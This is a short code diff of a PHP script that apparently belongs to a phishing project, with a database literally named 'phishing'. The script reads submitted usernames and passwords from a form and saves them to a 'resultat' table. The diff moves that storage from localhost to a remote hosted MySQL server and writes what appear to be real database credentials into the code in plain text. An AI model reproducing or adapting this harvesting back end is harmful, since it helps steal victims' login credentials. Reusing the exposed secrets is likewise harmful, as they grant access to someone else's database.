@@ -16,23 +16,21 @@
 
 
     try {
-        $bdd = new PDO('mysql:host=localhost;dbname=phishing;charset=utf8', 'root', '');
+        $bdd = new PDO('mysql:host=eu-cdbr-west-03.cleardb.net;dbname=heroku_b962d9c0b40ed7b;charset=utf8', 'be8f7e9f42c00f', 'cf163a32');
     } catch (Exception $e) {
         die('Erreur : ' . $e->getMessage());
     }
-
-
 
     $Username = $_POST["username"];
     $Password = $_POST["password"];
     echo $Username . " " . $Password;
 
 
-    $req = $bdd->prepare('INSERT INTO resultat( Username, Password,IP) 
-    VALUES( :Username, :Password ,"MonIP")');
+    $req = $bdd->prepare('INSERT INTO resultat(User, Password,IP) 
+    VALUES( :User, :Password ,"MonIP")');
 
     $req->execute(array(
-    'Username' => $Username,
+    'User' => $Username,
     'Password' => $Password
 
      ));
